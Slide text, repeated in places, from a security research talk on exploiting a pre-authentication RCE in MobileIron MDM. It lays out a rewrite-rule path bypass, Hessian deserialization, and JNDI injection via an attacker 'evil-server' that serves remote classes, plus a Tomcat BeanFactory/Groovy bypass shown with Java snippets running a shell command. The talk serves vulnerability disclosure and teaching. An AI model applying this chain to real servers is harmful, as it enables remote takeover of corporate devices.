How I Hacked facebook
Again! by
Orange Tsai
Orange Tsai
• Principal security researcher at DEVCORE
• Captain of HITCON CTF team
• 0day researcher, focusing on 
Web/Application security
orange_8361
Infiltrating Corporate Intranet 
Like NSA
Pre-auth RCE on Leading SSL VPNs
Orange Tsai (@orange_8361)
Meh Chang (@mehqq_)
USA 2019
Disclaimer
所有漏洞皆经过 合·法·流·程 回报并且 修·复·完·成
MDM(Mobile Device Management)
https://www.manageengine.com/products/desktop-central/images/MDM_features.png
常见 MDM 解决方案
VMWare AirWatch
MobileIron
Microsoft Intune
Trend Micro Mobile Security
IBM MaaS 360
Jamf Pro
Citrix XenMobi
Apple DEP/Profile Manager
Sophos Mobile Control
ManageEngine
常见 MDM 解决方案
VMWare AirWatch
MobileIron
Microsoft Intune
Trend Micro Mobile Security
IBM MaaS 360
Jamf Pro
Citrix XenMobi
Apple DEP/Profile Manager
Sophos Mobile Control
ManageEngine
Why MobileIron?
1. 根据官网，至少 20,000+ 企业使选择
2. 至少 15% 的财富世界 500 大公司选择、且暴露在外网
3. 台湾企业使用比例最高的 MDM
4.
Facebook 有在使用!
如何开始?
怎么跑起来?
痛苦。
架构
Tomcat
MI Server
443/8443 Apache
9997 MI Protocol
Reverse Proxy
TLS Proxy
找洞!
1.
该防的都有防
2. 没有很好打
3. 但也不算很难打
Vulnerability
Tomcat
MI Server
Reverse Proxy
TLS Proxy
443  Apache
9997 MI Protocol
8443 Apache
Tomcat
MI Server
Reverse Proxy
TLS Proxy
443  Apache
9997 MI Protocol
8443 Apache
Web Service speaks Hessian!
Touch through Manage Interface
Tomcat
MI Server
Reverse Proxy
TLS Proxy
443  Apache
9997 MI Protocol
8443 Apache
Tomcat
MI Server
Reverse Proxy
TLS Proxy
443  Apache
9997 MI Protocol
8443 Apache
Touch through User Interface…???
❌
Rewrite Rules :(
RewriteRule ^/mifs/services/(.*)$     …     [R=307,L]
RewriteRule ^/mifs/services         
-
[F]
RewriteRule ^/mifs/services/(.*)$     …     [R=307,L]
RewriteRule ^/mifs/services         
-
[F]
/mifs/services/fooService
RewriteRule ^/mifs/services/(.*)$     …     [R=307,L]
RewriteRule ^/mifs/services         
-
[F]
/mifs/.;/services/fooService
Hessian Deserialization
Hessian Deserialization
• Java Unmarshaller Security
• A paper written by @mbechler in May 2017
• Known gadgets on Hessian Deserialization:
Gadget Name
Effect
Spring-AOP
JNDI Injection
XBean
JNDI Injection
Resin
JNDI Injection
ROME
RCE
What is JNDI Injection?
Java 提供的 API 介面, 方便开发者 动·态·存·取 物件
jdbc:mysql://localhost:3306/database
Why JNDI Injection?
CVE-2015-2590
Pawn Storm (APT28, Fancy Bear)
以前的骇客
现在的骇客
JNDI/LDAP Injection
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
A Naming Reference with Factory and 
URLCodeBase=http://evil-server/
3. The class loader:
•
Can’t find the Factory Class
•
Fetch Class through our URLCodeBase
4. Return Evil Java Class
5. Boom! RCE!
Payload
Hacker
MobileIron
Evil Server
1
5
3
2
LDAP Connection
JNDI Reference
HTTP Connection
Evil Class
4
Java mitigated the JNDI/LDAP
in Oct 2018 (CVE-2018-3149)
JNDI/LDAP Injection
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
A Naming Reference with Factory and 
URLCodeBase=http://evil-server/
3. The class loader:
•
Can’t find the Factory Class
•
Fetch Class through our URLCodeBase
4. Return Evil Java Class
5. Boom! RCE!
Hacker
MobileIron
Evil Server
1
5
3
2
4
Payload
LDAP Connection
JNDI Reference
HTTP Connection
Evil Class
JNDI/LDAP Injection after Oct 2018 
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
A Naming Reference with Factory and 
URLCodeBase=http://evil-server/
3. The class loader:
•
Can’t find the Factory Class
•
Fetch Class through our URLCodeBase
4. Return Evil Java Class
5. Boom! RCE!
Hacker
MobileIron
Evil Server
1
5
3
2
4
Payload
LDAP Connection
JNDI Reference
HTTP Connection
Evil Class
The bypass!
What's the next?
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
A Naming Reference with Factory and 
URLCodeBase=http://evil-server/
3. The class loader:
•
Can’t find the Factory Class
•
Fetch Class through our URLCodeBase
4. Return Evil Java Class
5. Boom! RCE!
Hacker
MobileIron
Evil Server
1
5
3
2
4
Payload
LDAP Connection
JNDI Reference
HTTP Connection
Evil Class
What's the next?
1.
Hessian Deserialization triggers:
•
A LDAP connection to Evil LDAP Server
2. Evil LDAP server replies:
•
A Naming Reference with Factory and 
URLCodeBase=http://evil-server/
3. The class loader:
•
Can’t find the Factory Class
•
Fetch Class through our URLCodeBase
4. Return Evil Java Class
5. Boom! RCE!
Hacker
MobileIron
Evil Server
1
5
3
2
4
Payload
LDAP Connection
JNDI Reference
HTTP Connection
Evil Class
Reference to Local is still available!
Leverage the Local Factory
• org.apache.naming.factory.BeanFactory (Tomcat 6-8)
• If there is a forceString in reference, then:
• Parse the forceString as key-value pairs
• Invoke the value as a setter to set the specified field, for example:
ResourceRef ref = new ResourceRef(
"tw.orange.User", null, "", "", true, 
"org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "name=setName"));
ref.add(new StringRefAddr("name", "orange"));
Leverage the Local Factory
• org.apache.naming.factory.BeanFactory (Tomcat 6-8)
• If there is a forceString in reference, then:
• Parse the forceString as key-value pairs
• Invoke the value as a setter to set the specified field, for example:
ResourceRef ref = new ResourceRef(
"tw.orange.User", null, "", "", true, 
"org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "name=setName"));
ref.add(new StringRefAddr("name", "orange"));
Leverage the Local Factory
• org.apache.naming.factory.BeanFactory (Tomcat 6-8)
• If there is a forceString in reference, then do:
• Parse the forceString as key-value pairs
• Invoke the value as a setter to set the specified field, for example:
ResourceRef ref = new ResourceRef(
"tw.orange.User", null, "", "", true, 
"org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "name=setUsername"));
ref.add(new StringRefAddr("name", "orange"));
tw.orange.User().setName("orange")
Method Invoke
javax.el.ELProcessor().eval("evil…")
• Tomcat 8.5+ only, our remote version is 7.0.92
groovy.lang.GroovyClassLoader().parseClass("…")
• Make Meta Programming great again!
• Groovy 2.0+ only, our remote version is 1.5.6
groovy.lang.GroovyShell().evaluate("…")
https://github.com/welk1n/JNDI-Injection-Bypass/pull/1
New Groovy chain! Work on all versions
Bypass with Local Reference
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
??????
Hacker
MobileIron
Evil Server
1
2
Payload
LDAP Connection
??????
Bypass with Local Reference
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
Local Factory 
org.apache.naming.factory.BeanFactory
Hacker
MobileIron
Evil Server
1
2
Payload
LDAP Connection
Local Factory
Bypass with Local Reference
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
Local Factory 
org.apache.naming.factory.BeanFactory
•
Local Object Reference
Groovy.shell.GroovyShell with properties:
•
forceString is foo=evaluate
•
foo is “uname -a”.execute()
Hacker
MobileIron
Evil Server
1
2
Payload
LDAP Connection
Local Factory
Object Reference
Bypass with Local Reference
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
Local Factory 
org.apache.naming.factory.BeanFactory
•
Local Object Reference
Groovy.shell.GroovyShell with properties:
•
forceString is foo=evaluate
•
foo is “uname -a”.execute()
3. Factory loads and populates Object
4. Boom! RCE!
Hacker
MobileIron
Evil Server
1
2
Payload
LDAP Connection
Local Factory
3
4
Object Reference
Bypass with Local Reference
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
Local Factory 
org.apache.naming.factory.BeanFactory
•
Local Object Reference
Groovy.shell.GroovyShell with properties:
•
forceString is foo=evaluate
•
foo is “uname -a”.execute()
3. Factory loads and populates Object
4. Boom! RCE!
Hacker
MobileIron
Evil Server
1
2
Payload
LDAP Connection
Local Factory
3
4
Object Reference
❌
Bypass with Local Reference
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
Local Factory 
org.apache.naming.factory.BeanFactory
•
Local Object Reference
Groovy.shell.GroovyShell with properties:
•
forceString is foo=evaluate
•
foo is “uname -a”.execute()
3. Factory loads and populates Object
4. Boom! RCE!
Hacker
MobileIron
Evil Server
1
2
Payload
LDAP Connection
Local Factory
3
4
Object Reference
❌
Bypass with Local Reference
1.
Hessian Deserialization triggers:
•
A LDAP connection to Evil RMI Server
2. Evil LDAP server replies:
•
Local Factory 
org.apache.naming.factory.BeanFactory
•
Local Object Reference
Groovy.shell.GroovyShell with properties:
•
forceString is foo=evaluate
•
foo is “uname -a”.execute()
3. Factory loads and populate Object
4. Boom! RCE!
Hacker
MobileIron
Evil Server
1
2
Payload
RMI Connection
Local Factory
3
4
Object Reference
❌
重·读·论·文。
为什么补这句话?
Git Blame
Git Blame
Exploit with JNDI Bypass
1.
Hessian Deserialization triggers:
•
A connection to Evil LDAP Server
2. Evil LDAP server replies:
•
Local Factory 
org.apache.naming.factory.BeanFactory
•
Local Object Reference
Groovy.shell.GroovyShell with properties:
•
forceString is foo=evaluate
•
foo is “uname -a”.execute()
3. Factory loads and populate Object
4. Boom! RCE!
Hacker
MobileIron
Evil Server
1
2
Payload
LDAP Connection
Local Factory
3
4
Object Reference
Exploit with New Gadget
1. Hessian Deserialization
triggers:
• Local Groovy gadgets
• Boom! RCE!
Hacker
MobileIron
1
Payload
Demo
https://youtu.be/hGTLIIOb14A
漏洞回报
orange_8361
PI:EMAIL
Thanks!
https://blog.orange.tw